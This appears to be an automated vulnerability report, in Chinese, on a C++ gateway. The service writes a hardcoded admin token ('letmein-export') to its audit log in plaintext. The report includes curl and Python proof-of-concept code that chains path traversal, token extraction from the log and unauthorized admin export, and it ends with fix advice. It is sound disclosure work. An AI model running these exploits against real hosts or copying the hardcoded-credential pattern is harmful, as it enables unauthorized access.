# VULN-SEC-MAIN-005: 管理端认证 Token 明文写入审计日志，可导致凭证泄露与未授权访问

**严重性**: High | **CWE**: CWE-532 (Insertion of Sensitive Information into Log File) | **置信度**: 85/100
**位置**: `src/main.cpp:71-72` @ `main (GET /admin/export lambda)`

---

## 1. 漏洞细节

`GET /admin/export` 路由处理函数从 HTTP 请求的 URL 查询参数中提取管理员认证 token（`token` 字段），随后将该 token 以明文形式作为 `detail` 参数传入 `AuditLog::event()` 方法。`AuditLog::event()` 将 `detail` 字段原样写入审计日志文件 `edge-gateway.audit.log`，未进行任何脱敏、掩码或哈希处理。

该 token 是访问管理导出功能的唯一认证凭据——`FileCache::exportSnapshot()` 函数（`src/file_cache.cpp:22`）通过硬编码字符串 `"letmein-export"` 进行比对验证。这意味着：

1. **Token 为静态硬编码凭证**：不会过期、不会轮换，一旦泄露即永久有效
2. **Token 以明文持久化存储**：日志文件以追加模式（`std::ios::app`）打开，token 永久保留在日志中
3. **无访问前置认证**：`/admin/export` 路由在写入日志前不执行任何身份验证，任何人都可以触发该写入
4. **日志文件可能被多方访问**：日志聚合系统、运维人员、备份介质、日志传输服务均可能接触到明文 token

此外，URL 查询参数中的 token 还可能出现在 Web 服务器访问日志、代理服务器日志、浏览器历史记录、Referer 头等多个位置，进一步扩大凭证泄露面。

## 2. 漏洞代码

**文件**: `src/main.cpp` (行 70-74)

```cpp
server.route("GET", "/admin/export", [&](const HttpRequest& request) {
    std::string token = queryValue(request, "token");   // 行71: 从URL提取token，无清洗
    audit.event("admin", "export", token);               // 行72: token明文写入审计日志 [SINK]
    return text(200, files.exportSnapshot(token));        // 行73: token用于硬编码比对
});
```

**文件**: `include/audit_log.hpp` (行 11-15)

```cpp
void event(const std::string& user, const std::string& action, const std::string& detail) {
    out_ << std::time(nullptr) << " user=" << user
         << " action=" << action
         << " detail=" << detail << "\n";   // 行14: detail（即token）原样写入文件 [最终SINK]
}
```

**文件**: `src/file_cache.cpp` (行 21-24) — 硬编码 token 比对

```cpp
std::string FileCache::exportSnapshot(const std::string& token) const {
  if (token != "letmein-export") {   // 行22: 硬编码的管理员token
    return "denied\n";
  }
  // ... 导出系统快照数据
}
```

**文件**: `src/main.cpp` (行 13-16) — queryValue 辅助函数

```cpp
std::string queryValue(const HttpRequest& request, const std::string& key) {
  auto found = request.query.find(key);
  return found == request.query.end() ? "" : found->second;  // 直接返回，无任何清洗
}
```

**逐段分析**：

- **行 71**：`queryValue()` 从 HTTP 请求的 `query` map 中直接取出 `token` 值，不做任何验证或脱敏
- **行 72**：提取的 token 作为 `detail` 参数传入 `audit.event()`，该方法在 `audit_log.hpp:14` 将 token 原样写入日志文件
- **行 73**：同一个 token 被传入 `exportSnapshot()`，在 `file_cache.cpp:22` 与硬编码字符串 `"letmein-export"` 比对
- **关键根因**：审计日志模块 `AuditLog` 缺乏对敏感数据的识别和脱敏机制，所有传入的 `detail` 字段均被无差别地明文记录

## 3. 完整攻击链路

```
[网络入口] HttpServer::run()@src/http_server.cpp:106
  ↓ TCP accept() 接收远程 HTTP 连接，recv() 读取请求数据到栈缓冲区
[请求解析] HttpServer::parseRequest()@src/http_server.cpp
  ↓ 解析 HTTP 请求，提取 URL 查询参数到 request.query map
[路由分发] HttpServer::run()@src/http_server.cpp
  ↓ 匹配 "GET /admin/export" 路由，调用注册的 lambda handler
[Token提取] queryValue(request, "token")@src/main.cpp:71
  ↓ 从 request.query["token"] 取出用户提供的 token 字符串，无任何清洗
[日志写入] audit.event("admin", "export", token)@src/main.cpp:72
  ↓ token 作为 detail 参数传入 AuditLog::event()
[最终Sink] out_ << " detail=" << detail@include/audit_log.hpp:14
  ↓ token 以明文追加写入 edge-gateway.audit.log 文件
[凭证持久化] 日志文件保留明文 token，可被后续读取利用
```

**攻击链路详细说明**：

1. **网络入口**（`http_server.cpp:106`）：`HttpServer::run()` 在 `INADDR_ANY`（0.0.0.0）上绑定 TCP 端口（默认 8080），`accept()` 接受来自任意远程主机的连接。信任级别为 `untrusted_network`。

2. **请求解析**：`parseRequest()` 将原始 HTTP 数据解析为 `HttpRequest` 结构体，URL 查询参数存入 `request.query` map。此过程不对参数值做任何安全过滤。

3. **路由匹配**：服务器根据 method+path 匹配到 `GET /admin/export` 路由，调用对应的 lambda 处理函数。注意：**路由处理前无任何认证中间件或访问控制检查**。

4. **Token 提取**（`main.cpp:71`）：`queryValue(request, "token")` 从查询参数中取出 `token` 值。该函数（行 13-16）仅做 map 查找，返回原始字符串。

5. **日志写入**（`main.cpp:72` → `audit_log.hpp:14`）：token 作为 `detail` 参数传入 `AuditLog::event()`，通过 `operator<<` 直接写入文件流。日志格式为 `timestamp user=admin action=export detail=<明文token>`。

6. **凭证持久化**：日志文件以 `std::ios::app` 模式打开，token 永久追加存储。任何拥有日志文件读权限的实体均可提取该 token。

## 4. 攻击场景

**攻击者画像**: 具有日志文件读取能力的内部人员、通过其他漏洞（如路径遍历 VULN-DF-FC-001）获取日志文件访问权的远程攻击者、或能够接触日志传输/备份介质的第三方

**攻击向量**: 通过获取审计日志文件内容，提取明文管理员 token，随后利用该 token 访问管理导出功能

**利用难度**: 低

### 攻击步骤

1. **获取日志文件访问权**：攻击者通过以下任一途径获取 `edge-gateway.audit.log` 的内容：
   - 利用路径遍历漏洞（如 `GET /files?name=../edge-gateway.audit.log`）读取日志文件
   - 通过运维权限直接访问服务器文件系统
   - 截获日志传输流（如 syslog forwarding、log shipping）
   - 访问未受保护的日志备份或归档

2. **提取管理员 Token**：在日志内容中搜索 `action=export` 记录，从 `detail=` 字段提取明文 token 值（如 `letmein-export`）

3. **利用 Token 访问管理功能**：使用提取的 token 构造请求 `GET /admin/export?token=letmein-export`，获取系统快照数据（用户数量、备份状态、数据目录路径等敏感信息）

4. **持久化访问**：由于 token 为硬编码静态值，攻击者可无限期重复使用，无需重新获取

### 辅助攻击场景

- **URL 泄露链**：token 出现在 URL 查询参数中，会被记录在 Web 服务器访问日志、代理日志、浏览器历史记录中，扩大泄露面
- **Referer 泄露**：如果管理页面包含外部链接，token 可能通过 HTTP Referer 头泄露给第三方网站
- **社工钓鱼**：攻击者可构造包含恶意 token 的 URL 诱骗管理员访问，将管理员的合法 token 记录到攻击者可控的日志中

## 5. 攻击条件

| 条件类型   | 要求                   | 说明                                                                                                       |
| ---------- | ---------------------- | ---------------------------------------------------------------------------------------------------------- |
| 网络可达性 | 需要访问日志文件       | 攻击者需通过文件系统读取、路径遍历漏洞或日志传输渠道获取 `edge-gateway.audit.log` 的内容                  |
| 认证要求   | 无需认证（日志读取侧） | 日志文件本身无访问控制机制；如通过路径遍历获取，也无需认证                                                 |
| 配置依赖   | 默认配置即可触发       | 审计日志在应用启动时自动创建（`main.cpp:33`），所有 `/admin/export` 请求的 token 均被记录，无需特殊配置   |
| 环境依赖   | 无特殊要求             | 漏洞存在于应用逻辑层，与操作系统和编译器无关；日志文件存储在应用工作目录下                                 |
| 时序条件   | 无                     | 只要有合法用户曾调用过 `/admin/export`，日志中即存在有效 token；攻击者也可自行触发写入任意 token 值        |

## 6. 造成影响

| 影响维度 | 等级 | 说明                                                                                                     |
| -------- | ---- | -------------------------------------------------------------------------------------------------------- |
| 机密性   | 高   | 管理员认证 token 明文泄露，攻击者可获取管理导出功能的访问权限，读取系统快照数据（用户数、目录结构等）   |
| 完整性   | 中   | 攻击者可利用泄露的 token 调用 `exportSnapshot()`，虽然当前仅返回只读数据，但 token 可被用于构造更复杂的攻击链 |
| 可用性   | 低   | 日志文件增长可能消耗磁盘空间，但影响有限                                                                 |

**影响范围**: 

- **直接影响**：管理员认证凭证（硬编码 token `letmein-export`）泄露，攻击者可未授权访问管理导出功能
- **间接影响**：若 token 被用于其他系统的认证（凭证复用），影响范围可能扩展到其他服务
- **横向扩展**：系统快照中包含 `data_dir` 路径信息，可为后续文件系统攻击提供情报
- **持久性**：由于 token 为硬编码静态值且日志以追加模式写入，凭证泄露是永久性的，无法通过重启或清除会话来缓解

## 7. PoC (概念验证)

> ⚠️ 以下 PoC 仅供安全测试和验证使用

### PoC 1: 触发 Token 写入日志

```bash
# 向 /admin/export 发送请求，将 token 写入审计日志
curl -v "http://TARGET_HOST:8080/admin/export?token=letmein-export"
```

### PoC 2: 从日志中提取 Token（模拟路径遍历场景）

```bash
# 假设存在路径遍历漏洞，通过 /files 端点读取审计日志
curl "http://TARGET_HOST:8080/files?name=../edge-gateway.audit.log"
```

### PoC 3: 完整利用链 Python 脚本

```python
#!/usr/bin/env python3
"""
PoC: VULN-SEC-MAIN-005 - 管理 Token 日志泄露利用
仅供安全测试和验证使用
"""
import re
import requests

TARGET = "http://TARGET_HOST:8080"

# 步骤1: 触发 token 写入日志（模拟正常使用）
print("[*] 步骤1: 触发 admin export，将 token 写入审计日志...")
resp = requests.get(f"{TARGET}/admin/export", params={"token": "letmein-export"})
print(f"    响应状态: {resp.status_code}")
print(f"    响应内容: {resp.text.strip()}")

# 步骤2: 通过路径遍历读取审计日志
print("\n[*] 步骤2: 通过路径遍历读取审计日志文件...")
resp = requests.get(f"{TARGET}/files", params={"name": "../edge-gateway.audit.log"})
log_content = resp.text
print(f"    日志内容:\n{log_content}")

# 步骤3: 从日志中提取 admin token
print("\n[*] 步骤3: 从日志中提取 admin token...")
tokens = re.findall(r'action=export detail=(\S+)', log_content)
if tokens:
    extracted_token = tokens[-1]  # 取最新的 token
    print(f"    提取到的 token: {extracted_token}")
    
    # 步骤4: 使用提取的 token 访问管理功能
    print(f"\n[*] 步骤4: 使用提取的 token 访问管理导出功能...")
    resp = requests.get(f"{TARGET}/admin/export", params={"token": extracted_token})
    print(f"    响应状态: {resp.status_code}")
    print(f"    导出的数据:\n{resp.text}")
else:
    print("    未找到 export token")
```

### PoC 4: 验证日志文件内容

```bash
# 直接在服务器上查看日志文件内容（验证用途）
cat edge-gateway.audit.log | grep "action=export"
# 预期输出类似:
# 1718690000 user=admin action=export detail=letmein-export
```

**使用说明**: 

1. 将 `TARGET_HOST` 替换为目标服务器地址
2. 首先执行 PoC 1 触发 token 写入日志
3. 然后执行 PoC 2 或 PoC 3 验证从日志中提取 token 并复用的完整攻击链
4. PoC 4 用于在服务器端直接验证日志内容

**预期结果**: 

- 审计日志文件中出现包含 `detail=letmein-export` 的记录
- 从日志中提取的 token 可成功用于调用 `/admin/export` 接口
- 返回系统快照数据：`users=3`, `last_backup=disabled`, `data_dir=data`

## 8. 验证环境搭建

### 基础环境

- 操作系统: Linux (Ubuntu 20.04+ / Debian 11+ / 任意支持 C++17 的 Linux 发行版)
- 编译器: GCC 9+ 或 Clang 10+（需支持 C++17 标准）
- 构建工具: CMake 3.16+ 或 Make
- 依赖: 无外部库依赖，项目为自包含的 HTTP 服务

### 构建步骤

```bash
# 克隆项目源码
cd /scan/project

# 使用 CMake 构建（如果项目提供 CMakeLists.txt）
mkdir -p build && cd build
cmake .. -DCMAKE_BUILD_TYPE=Debug
make -j$(nproc)

# 或使用 Makefile（如果项目提供）
make

# 或手动编译
g++ -std=c++17 -I include -o edge-gateway src/main.cpp src/http_server.cpp src/user_store.cpp src/file_cache.cpp src/diagnostics.cpp
```

### 运行配置

```bash
# 启动服务（默认端口 8080）
./edge-gateway

# 或指定端口
./edge-gateway 9090

# 确保工作目录下存在 data/ 子目录（FileCache 需要）
mkdir -p data
```

### 验证步骤

1. **启动服务**：运行编译后的 `edge-gateway` 可执行文件
2. **触发漏洞**：发送请求 `curl "http://localhost:8080/admin/export?token=letmein-export"`
3. **检查日志**：查看 `edge-gateway.audit.log` 文件内容
4. **验证泄露**：确认日志中包含 `detail=letmein-export` 明文 token
5. **验证利用**：使用从日志中提取的 token 再次调用 `/admin/export`，确认可以获取系统快照数据

### 预期结果

审计日志文件 `edge-gateway.audit.log` 中出现如下格式的记录：

```
1718690000 user=admin action=export detail=letmein-export
```

其中 `detail=letmein-export` 为明文管理员 token，可被任何具有日志文件读权限的实体提取并复用。

---

## 修复建议

1. **日志脱敏**：在 `AuditLog::event()` 中对 `detail` 字段进行脱敏处理，对 token 类数据使用掩码（如仅保留前4位：`letm****`）或哈希替代
2. **避免 URL 传递凭证**：将 token 从 URL 查询参数移至 HTTP 请求头（如 `Authorization: Bearer <token>`），避免 URL 泄露链
3. **替换硬编码凭证**：使用环境变量或安全密钥管理系统存储 export token，避免静态硬编码
4. **日志访问控制**：对审计日志文件设置严格的文件系统权限（如 `chmod 600`），仅允许应用进程和授权运维人员读取
5. **Token 轮换机制**：实现 token 定期轮换和过期机制，降低单次泄露的长期影响
